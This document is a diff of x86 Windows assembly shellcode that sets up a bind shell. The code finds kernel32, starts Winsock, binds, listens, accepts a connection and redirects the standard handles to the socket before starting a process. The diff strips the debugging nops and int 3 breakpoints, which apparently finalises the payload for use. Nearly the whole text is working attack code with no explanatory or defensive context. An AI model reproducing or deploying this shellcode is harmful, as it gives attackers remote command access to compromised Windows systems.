@@ -143,12 +143,6 @@ _start:
         
     ; ======= Main
     start_asm:
-    	nop
-	nop
-	nop
-	nop
-	nop
-	nop
         sub esp, 0x08                   ; Allocate space on stack for function addresses
         mov ebp, esp                    ; Set ebp as frame ptr for relative offset on stack
         call find_kernel32              ; Find base address of kernel32.dll
@@ -197,7 +191,6 @@ _start:
             ; Initialize winsock
             push esp                        ; Use stack for WSADATA
             push 0x02                       ; wVersionRequested
-	    int 3
             call [ebp+20h]                  ; call WSAStartup
 
 	    add esp, 0x0300		    ; Move esp over WSAData
@@ -212,7 +205,6 @@ _start:
             push eax                        ; type = 1
             inc eax                         ; EAX = 2
             push eax                        ; af = 2
-	    int 3
             call [ebp+0x10]                 ; call WSASocket
             mov esi, eax                    ; Save the socket file descriptor in ESI
             
@@ -230,13 +222,11 @@ _start:
             push ebx                        ; namelen = 0x10
             push eax                        ; name = SOCKADDR Structure on stack
             push esi                        ; descriptor = WSASocket file descriptor
-	    int 3
             call [ebp+0x14]                 ; call bind
         
         listen:
             push ebx                        ; backlog = 0x10
             push esi                        ; descriptor = WSASocket file descriptor
-	    int 3
             call [ebp+0x18]                 ; call listen
             
         accept:
@@ -247,7 +237,6 @@ _start:
             push edx                        ; addrlen = 0x10
             push ecx                        ; addr = Output structure on stack
             push esi                        ; descriptor = WSASocket file descriptor
-	    int 3
             call [ebp+0x1C]                 ; call accept
 	    mov esi, eax		    ; Save the client file descriptor in ESI
             
@@ -272,7 +261,6 @@ _start:
             stosd                           ; Set the hStdError Attribute to the file descriptor returned from accept
             pop edi                         ; Restore EDI
         execute_process:
-    	    int 3			    ; debugging break
             xor eax, eax                    ; Zero EAX
             lea esi, [edi+0x44]             ; Load the effective address of the PROCESS_INFORMATION structure into ESI
             push esi                        ; Push the pointer to the lpProcessInformation structure
